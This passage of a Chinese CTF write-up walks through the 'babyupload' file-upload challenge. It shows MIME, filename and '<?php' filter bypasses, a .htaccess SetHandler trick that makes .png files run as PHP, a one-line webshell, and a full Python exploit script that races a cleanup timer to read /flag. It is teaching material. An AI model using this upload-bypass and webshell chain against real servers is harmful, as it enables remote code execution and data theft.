+<li><strong>后端服务器是 Apache</strong>，而且版本是 2.4.10（Debian）。</li>
+</ol>
+<p>Apache 有一个招牌特性：<strong><code>.htaccess</code></strong>。它是放在目录里的配置文件，Apache 每次处理该目录的请求时都会读它。只要 <code>AllowOverride</code> 允许，攻击者就能通过上传 <code>.htaccess</code> 改变这个目录的解析行为。</p>
+<div class="note info flat"><p><strong><code>Server: openresty</code> 和 <code>Apache</code> 不矛盾。</strong></p>
+<p>上传响应头里的 <code>Server</code> 是 <code>openresty</code>（Nginx 系），404 页脚却是 <code>Apache/2.4.10</code>。这通常说明前面有一层 openresty 反向代理，真正执行 PHP 的是后面的 Apache。<code>.htaccess</code> 是否生效，取决于后端 Apache 的 <code>AllowOverride</code>，不要被最外层的 <code>Server</code> 头带偏。</p>
+</div>
+
+<div class="note info flat"><p><strong>如果后端不是 Apache 呢？</strong></p>
+<p>Nginx 不读 <code>.htaccess</code>，同样的思路要换成 <code>user.ini</code> &#x2F; <code>.user.ini</code>、<code>fastcgi_param</code> 或者找别的解析漏洞。所以“服务器是什么”不是背景知识，而是<strong>决定下一步走哪条路的关键信息</strong>。本题的 404 页面把 Apache 写在页脚，等于把路标递到了手上。</p>
+</div>
+
+<h3 id="SetHandler-是怎么工作的"><a href="#SetHandler-是怎么工作的" class="headerlink" title="SetHandler 是怎么工作的"></a>SetHandler 是怎么工作的</h3><p>Apache 处理一个文件时，会先决定用哪个 <strong>handler</strong>。<code>.png</code> 默认走静态文件 handler；PHP 文件走 <code>application/x-httpd-php</code>。</p>
+<p><code>.htaccess</code> 里的这一行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>意思是：<strong>这个目录下的所有文件，都交给 <code>application/x-httpd-php</code> 这个 handler 处理</strong>，不管后缀是什么。</p>
+<p>于是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit.png  →  Apache 读到 SetHandler  →  交给 PHP  →  执行文件内容</span><br></pre></td></tr></table></figure>
+
+<p>这就把“后缀必须是 <code>.php</code>”的限制绕开了。后缀还是 <code>.png</code>，内容还是 PHP，但解析器已经被换掉了。</p>
+<div class="note warning flat"><p><strong><code>x-httpd-php</code> 别少写那个 <code>d</code>。</strong></p>
+<p>正确写法是：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>不是 <code>application/x-http-php</code>。少一个 <code>d</code>，Apache 找不到对应 handler，通常不会报错，只会继续按静态文件处理——表现就是“<code>.htaccess</code> 传上去了，但木马还是不执行”，非常容易误判。</p>
+</div>
+
+<h3 id="SetHandler、AddHandler、AddType-的区别"><a href="#SetHandler、AddHandler、AddType-的区别" class="headerlink" title="SetHandler、AddHandler、AddType 的区别"></a>SetHandler、AddHandler、AddType 的区别</h3><p><code>.htaccess</code> 里让文件被 PHP 解析，常见有三种写法：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+<th>影响范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SetHandler application/x-httpd-php</code></td>
+<td>强制整个目录用 PHP handler</td>
+<td>目录下所有文件</td>
+</tr>
+<tr>
+<td><code>AddHandler application/x-httpd-php .png</code></td>
+<td>把 <code>.png</code> 这个后缀映射到 PHP handler</td>
+<td>指定后缀</td>
+</tr>
+<tr>
+<td><code>AddType application/x-httpd-php .png</code></td>
+<td>把 <code>.png</code> 的 MIME 类型改成 PHP</td>
+<td>指定后缀，依赖 mod_mime</td>
+</tr>
+</tbody></table>
+<p>本题用 <code>SetHandler</code> 最直接：不用关心后缀，整个目录都归 PHP。缺点是会把目录里的图片也当 PHP 执行（如果图片不是合法 PHP，可能报错或输出乱码），但在 CTF 里无所谓。</p>
+<p>如果 <code>SetHandler</code> 不生效，可以按顺序换 <code>AddHandler</code>、<code>AddType</code> 再试。三者都依赖一个前提：<strong>Apache 允许 <code>.htaccess</code> 生效</strong>。</p>
+<h3 id="AllowOverride：-htaccess-的开关"><a href="#AllowOverride：-htaccess-的开关" class="headerlink" title="AllowOverride：.htaccess 的开关"></a>AllowOverride：.htaccess 的开关</h3><p>Apache 的主配置里有一项 <code>AllowOverride</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>None</code>：完全忽略 <code>.htaccess</code>，传了也白传；</li>
+<li><code>All</code>：允许所有指令；</li>
+<li><code>FileInfo</code>：允许 <code>SetHandler</code>、<code>AddType</code> 这类与文件处理相关的指令。</li>
+</ul>
+<p>本题能打通，说明上传目录的 <code>AllowOverride</code> 至少允许了 <code>FileInfo</code> 级别的指令。如果传了 <code>.htaccess</code> 之后访问目录变成 <strong>500 Internal Server Error</strong>，通常就是 <code>.htaccess</code> 里的指令不被允许，或者语法写错了。</p>
+<h2 id="第六层：把-htaccess-和木马放进同一个目录"><a href="#第六层：把-htaccess-和木马放进同一个目录" class="headerlink" title="第六层：把 .htaccess 和木马放进同一个目录"></a>第六层：把 .htaccess 和木马放进同一个目录</h2><p><code>.htaccess</code> 只对<strong>它所在的目录及其子目录</strong>生效。所以它必须和木马在同一个上传目录里。</p>
+<p>本题的上传路径长这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png</span><br><span class="line">                └──────────┬──────────┘</span><br><span class="line">                     这一段是目录</span><br></pre></td></tr></table></figure>
+
+<p>这个目录名看起来像随机的十六进制串。它通常和<strong>会话</strong>绑定：同一个 <code>PHPSESSID</code> 上传的文件，会落在同一个目录；换一个会话，目录就变了。</p>
+<p>这意味着：</p>
+<ul>
+<li>不能先用浏览器传 <code>.htaccess</code>，再用 Burp 传木马——只要 Cookie 变了，目录就可能不同；</li>
+<li>用脚本时，必须用<strong>同一个 <code>requests.Session</code></strong>，让两次上传共享同一个 <code>PHPSESSID</code>；</li>
+<li>上传后从回显里解析出路径，<strong>确认两个文件的目录部分完全一致</strong>，再访问。</li>
+</ul>
+<p>最终脚本里加了这一步检查：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> htaccess_path.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>] != shell_path.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  [!] 两个文件不在同一目录，重试&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>如果两个文件不在同一目录，<code>.htaccess</code> 管不到木马，访问木马只会得到静态内容——表现出来就是“脚本一直跑，但永远没有 flag”。</p>
+<div class="note success flat"><p><strong><code>.htaccess</code> 本身也要过前三层检查。</strong></p>
+<p>它是通过同一个上传接口传的，所以同样要满足：</p>
+<ul>
+<li><code>Content-Type: image/jpeg</code>（脚本里统一用这个）；</li>
+<li>文件名不含 <code>ph</code>（<code>.htaccess</code> 不含）；</li>
+<li>内容不含 <code>&lt;?php</code>（<code>SetHandler</code> 这一行不含）。</li>
+</ul>
+<p>换句话说，<strong>在服务端眼里，<code>.htaccess</code> 只是另一张“图片”</strong>。它不检查你写的是什么指令，只检查 MIME、文件名和 <code>&lt;?php</code> 标记。</p>
+</div>
+
+<h2 id="第七层：3-秒清理与脚本竞速"><a href="#第七层：3-秒清理与脚本竞速" class="headerlink" title="第七层：3 秒清理与脚本竞速"></a>第七层：3 秒清理与脚本竞速</h2><p>题目环境还有一个坑：上传目录大约每 3 秒清理一次。</p>
+<p>这带来一个很现实的竞速问题：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传 .htaccess  →  上传木马  →  访问木马</span><br><span class="line">        ↑              ↑            ↑</span><br><span class="line">     可能被删       可能被删      必须还活着</span><br></pre></td></tr></table></figure>
+
+<p>手工用 Burp 也能做，但要在 3 秒内完成“改包 → 发送 → 改包 → 发送 → 浏览器访问”，很容易超时；而且两次上传必须共享 Cookie，手动复制 <code>PHPSESSID</code> 也麻烦。所以这题适合写脚本：</p>
+<ul>
+<li>用一个 <code>Session</code> 保持 Cookie；</li>
+<li>先传 <code>.htaccess</code>，再传木马；</li>
+<li>立刻访问木马；</li>
+<li>失败就重试，最多 30 次；</li>
+<li>木马文件名随机，访问时带随机查询参数，避免缓存和旧文件干扰。</li>
+</ul>
+<p>脚本第一次就成功时，输出就像图 7：</p>
+<p><img src="/2026/11/18/web-ctf-upload-babyupload/07-flag.png" alt="脚本运行结果"></p>
+<p><em>图 7：第 1 次尝试就拿到 flag，响应类型是 <code>text/html</code>，说明 <code>.png</code> 被 PHP 执行了</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;7794c465-e40e-46e4-b07c-3ff142955943&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><p>下面这版在原稿基础上做了几处加固：统一异常处理、校验两个文件的目录是否一致、用正则提取 flag、失败时给出明确提示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 换成你的靶场地址</span></span><br><span class="line">BASE = <span class="string">&quot;http://&lt;靶场地址&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 Apache 把这个目录下的所有文件都交给 PHP 处理</span></span><br><span class="line">HTACCESS = <span class="string">&quot;SetHandler application/x-httpd-php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一句话木马：直接读 /flag 并输出</span></span><br><span class="line"><span class="comment"># 用 &lt;script language=&quot;php&quot;&gt; 而不是 &lt;?php，因为内容黑名单拦 &lt;?php</span></span><br><span class="line">SHELL = <span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;echo file_get_contents(&quot;/flag&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?:CTF2|GXY|flag)\&#123;[^&#125;]*\&#125;&quot;</span>, re.I)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.trust_env = <span class="literal">False</span>   <span class="comment"># 不走系统代理，避免本机代理干扰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    上传一个文件，成功返回它的 Web 路径（如 /upload/abc/123.png）。</span></span><br><span class="line"><span class="string">    失败返回 None，并打印服务端的拒绝原因。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="comment"># 第三个元素是 Content-Type，服务端只认 image/jpeg</span></span><br><span class="line">        <span class="string">&quot;uploaded&quot;</span>: (filename, content, <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = session.post(BASE + <span class="string">&quot;/&quot;</span>, files=files, timeout=<span class="number">10</span>)</span><br><span class="line">        resp.raise_for_status()</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [!] 上传请求失败：<span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/upload/&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [!] 上传被拒：<span class="subst">&#123;resp.text[:<span class="number">120</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 回显：/var/www/html/upload/&lt;hash&gt;/&lt;name&gt; succesfully uploaded!</span></span><br><span class="line">    path = resp.text.split(<span class="string">&quot;/upload/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/upload/&quot;</span> + path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;==== 第 <span class="subst">&#123;attempt&#125;</span> 次尝试 ====&quot;</span>)</span><br><span class="line"></span><br><span class="line">        htaccess_path = upload(<span class="string">&quot;.htaccess&quot;</span>, HTACCESS)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> htaccess_path:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 文件名随机，避免网关缓存旧结果</span></span><br><span class="line">        shell_name = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">100000</span>, <span class="number">999999</span>)&#125;</span>.png&quot;</span></span><br><span class="line">        shell_path = upload(shell_name, SHELL)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> shell_path:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  .htaccess: <span class="subst">&#123;htaccess_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  webshell : <span class="subst">&#123;shell_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># .htaccess 只对所在目录生效，必须和木马同目录</span></span><br><span class="line">        <span class="keyword">if</span> htaccess_path.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>] != shell_path.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;  [!] 两个文件不在同一目录，重试&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 随机参数绕过缓存，也避免命中上一次的旧文件</span></span><br><span class="line">        url = BASE + shell_path + <span class="string">&quot;?t=&quot;</span> + <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">999999</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = session.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [!] 访问失败：<span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  status=<span class="subst">&#123;resp.status_code&#125;</span> type=<span class="subst">&#123;resp.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = FLAG_RE.search(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] flag = <span class="subst">&#123;<span class="keyword">match</span>.group(<span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  未命中，响应前 120 字符：<span class="subst">&#123;resp.text[:<span class="number">120</span>]!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[-] 30 次都没成功：确认靶场还在线、网络稳定、.htaccess 未被拦截&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="脚本里几个容易出错的点"><a href="#脚本里几个容易出错的点" class="headerlink" title="脚本里几个容易出错的点"></a>脚本里几个容易出错的点</h3><table>
+<thead>
+<tr>
+<th>代码</th>
+<th>为什么这么写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>session = requests.Session()</code></td>
+<td>保持 <code>PHPSESSID</code>，让 <code>.htaccess</code> 和木马落在同一个目录</td>
+</tr>
+<tr>
+<td><code>session.trust_env = False</code></td>
+<td>避免系统代理把请求转走，尤其是本机开了代理工具时</td>
+</tr>
+<tr>
+<td><code>files=&#123;&quot;uploaded&quot;: (...)&#125;</code></td>
+<td>字段名必须是 <code>uploaded</code>；第三个元素是伪造的 <code>Content-Type</code></td>
+</tr>
+<tr>
+<td><code>&quot;image/jpeg&quot;</code></td>
+<td>服务端只认这个 MIME；<code>.htaccess</code> 也要用它</td>
+</tr>
+<tr>
+<td><code>split(&quot;/upload/&quot;, 1)[1]</code></td>
+<td>从回显里取路径，比猜 md5 可靠</td>
+</tr>
+<tr>
+<td><code>rsplit(&quot;/&quot;, 1)[0]</code></td>
+<td>取目录部分，比较两个文件是否同目录</td>
+</tr>
+<tr>
+<td>随机文件名 + <code>?t=</code></td>
+<td>避免缓存、旧文件、文件名碰撞</td>
+</tr>
+<tr>
+<td><code>FLAG_RE</code></td>
+<td>同时兼容 <code>CTF2&#123;...&#125;</code>、<code>GXY&#123;...&#125;</code> 以及本地复现的 <code>flag&#123;...&#125;</code></td>
+</tr>
+<tr>
+<td><code>sys.exit(1)</code></td>
+<td>30 次都失败时明确退出，而不是静默结束</td>
+</tr>
+</tbody></table>
+<div class="note warning flat"><p><strong>不要在这次请求里加 <code>time.sleep()</code>。</strong></p>
+<p>清理周期只有约 3 秒，上传完 <code>.htaccess</code> 和木马后要<strong>立刻</strong>访问。加 sleep 等于主动把文件送进清理窗口。重试逻辑应该放在外层，而不是在两次上传之间等待。</p>
+</div>
+
+<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="1-文件上传的四层检查"><a href="#1-文件上传的四层检查" class="headerlink" title="1. 文件上传的四层检查"></a>1. 文件上传的四层检查</h3><p>把这道题抽象一下，文件上传的检查点通常有四层：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>检查内容</th>
+<th>常见实现</th>
+<th>本题情况</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>MIME 类型</td>
+<td><code>$_FILES[&#39;type&#39;]</code></td>
+<td>必须是 <code>image/jpeg</code></td>
+<td>Burp 改 <code>Content-Type</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>文件名&#x2F;后缀</td>
+<td>黑名单、白名单</td>
+<td><code>ph</code> 系列被拦</td>
+<td>用 <code>.png</code> &#x2F; <code>.jpg</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>文件内容</td>
+<td><code>preg_match</code>、<code>getimagesize</code></td>
+<td>拦 <code>&lt;?php</code></td>
+<td>换 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>执行解析</td>
+<td>后缀映射、目录配置</td>
+<td><code>.png</code> 不执行</td>
+<td><code>.htaccess</code> + <code>SetHandler</code></td>
+</tr>
+</tbody></table>
+<p><strong>前两层决定“能不能传”，第三层决定“内容能不能过”，第四层决定“传了有没有用”。</strong> 做题时按顺序逐层确认，不要看到“上传成功”就以为结束了。</p>
+<h3 id="2-MIME-检查的两种写法"><a href="#2-MIME-检查的两种写法" class="headerlink" title="2. MIME 检查的两种写法"></a>2. MIME 检查的两种写法</h3><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>读的是什么</th>
+<th>是否可信</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$_FILES[&#39;uploaded&#39;][&#39;type&#39;]</code></td>
+<td>请求里的 <code>Content-Type</code></td>
+<td>❌ 客户端可伪造</td>
+</tr>
+<tr>
+<td><code>finfo_file(finfo_open(FILEINFO_MIME_TYPE), $tmp_name)</code></td>
+<td>文件真实内容</td>
+<td>✅ 相对可靠</td>
+</tr>
+<tr>
+<td><code>getimagesize($tmp_name)</code></td>
+<td>文件是否是可解析图片</td>
+<td>✅ 对图片有效</td>
+</tr>
+<tr>
+<td><code>exif_imagetype($tmp_name)</code></td>
+<td>文件头魔数</td>
+<td>✅ 但对多语言文件有局限</td>
+</tr>
+</tbody></table>
+<p>本题用的是第一种，所以一个 <code>Content-Type: image/jpeg</code> 就过了。</p>
+<h3 id="3-内容黑名单为什么总被绕过"><a href="#3-内容黑名单为什么总被绕过" class="headerlink" title="3. 内容黑名单为什么总被绕过"></a>3. 内容黑名单为什么总被绕过</h3><p>内容黑名单通常是正则匹配，问题在于：</p>
+<ul>
+<li><strong>匹配的标记太具体</strong>：只拦 <code>&lt;?php</code>，就漏了 <code>&lt;?</code>、<code>&lt;script language=&quot;php&quot;&gt;</code>、<code>&lt;?=</code>；</li>
+<li><strong>只看开头</strong>：只在文件开头找 <code>&lt;?php</code>，可以在前面加垃圾字符；</li>
+<li><strong>不区分上下文</strong>：<code>php</code> 出现在注释、字符串里也算命中，导致误杀；反过来，攻击者可以用编码、拼接、大小写绕过；</li>
+<li><strong>不做语法分析</strong>：它不知道文件到底是不是合法 PHP，只知道“有没有这个字符串”。</li>
+</ul>
+<p>本题就是典型：<code>&lt;?php</code> 被拦，<code>&lt;script language=&quot;php&quot;&gt;</code> 里虽然有 <code>php</code>，但没有 <code>&lt;?php</code>，于是顺利通过。</p>
+<h3 id="4-htaccess-的适用范围"><a href="#4-htaccess-的适用范围" class="headerlink" title="4. .htaccess 的适用范围"></a>4. .htaccess 的适用范围</h3><table>
+<thead>
+<tr>
+<th>事实</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>只对所在目录及子目录生效</td>
+<td>所以必须和木马同目录</td>
+</tr>
+<tr>
+<td>需要 <code>AllowOverride</code> 允许</td>
+<td><code>None</code> 时完全无效</td>
+</tr>
+<tr>
+<td>是 Apache 特有</td>
+<td>Nginx 不读</td>
+</tr>
+<tr>
+<td>每次请求都会读</td>
+<td>改了立即生效，不用重启</td>
+</tr>
+<tr>
+<td>可以嵌套</td>
+<td>子目录可以有自己的 <code>.htaccess</code> 覆盖父目录</td>
+</tr>
+</tbody></table>
+<p>常见的解析接管写法：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 整个目录都交给 PHP</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只让 .png 交给 PHP</span></span><br><span class="line"><span class="attribute">AddHandler</span> application/x-httpd-php .png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 .png 的 MIME 改成 PHP</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让所有请求先包含一个文件（PHP-FPM 场景也常见）</span></span><br><span class="line"><span class="attribute">php_value</span> auto_prepend_file /var/www/html/upload/xxx.png</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-mod-php-与-PHP-FPM-的差异"><a href="#5-mod-php-与-PHP-FPM-的差异" class="headerlink" title="5. mod_php 与 PHP-FPM 的差异"></a>5. mod_php 与 PHP-FPM 的差异</h3><p><code>SetHandler application/x-httpd-php</code> 适用于 <strong>Apache + mod_php</strong>。如果 PHP 是通过 PHP-FPM 跑的，handler 名不一样，通常要写成：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> <span class="string">&quot;proxy:unix:/run/php/php7.4-fpm.sock|fcgi://localhost&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者用 <code>AddHandler</code> &#x2F; <code>AddType</code> 配合 FPM 的配置。本题的 <code>X-Powered-By</code> 和 404 页脚指向 Apache + PHP 5.6，<code>SetHandler</code> 能直接生效。</p>
+<p>判断方法：</p>
+<ul>
+<li>响应头有 <code>X-Powered-By: PHP/5.6.23</code>，只能说明跑了 PHP，不能区分 mod_php &#x2F; FPM；</li>
+<li>看 <code>Server</code> 头是 Apache；</li>
+<li>试 <code>SetHandler</code>，不通再换 <code>AddHandler</code> &#x2F; <code>AddType</code>；</li>
+<li>如果有 <code>phpinfo()</code>，看 <code>Server API</code>：<code>Apache 2.0 Handler</code> 是 mod_php，<code>FPM/FastCGI</code> 是 FPM。</li>
+</ul>
+<h3 id="6-上传目录与会话的绑定"><a href="#6-上传目录与会话的绑定" class="headerlink" title="6. 上传目录与会话的绑定"></a>6. 上传目录与会话的绑定</h3><p>本题的回显路径里有一段随机十六进制：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png</span><br></pre></td></tr></table></figure>
+
+<p>这类目录常见的生成方式：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>md5(session_id())</code></td>
+<td>同一会话固定，换会话就变</td>
+</tr>
+<tr>
+<td><code>md5(时间戳 + 随机数)</code></td>
+<td>每次上传都可能不同</td>
+</tr>
+<tr>
+<td>固定目录 + 随机文件名</td>
+<td>最容易利用</td>
+</tr>
+</tbody></table>
+<p>本题脚本用同一个 <code>Session</code> 能成功，说明目录和会话绑定。做题时要<strong>从回显里读路径</strong>，不要自己猜；猜错目录，<code>.htaccess</code> 就管不到木马。</p>
+<h3 id="7-竞态与脚本可靠性"><a href="#7-竞态与脚本可靠性" class="headerlink" title="7. 竞态与脚本可靠性"></a>7. 竞态与脚本可靠性</h3><p>3 秒清理意味着上传和访问之间存在竞争。脚本提高成功率的几个手段：</p>
+<table>
+<thead>
+<tr>
+<th>手段</th>
+<th>作用</th>
+</tr>
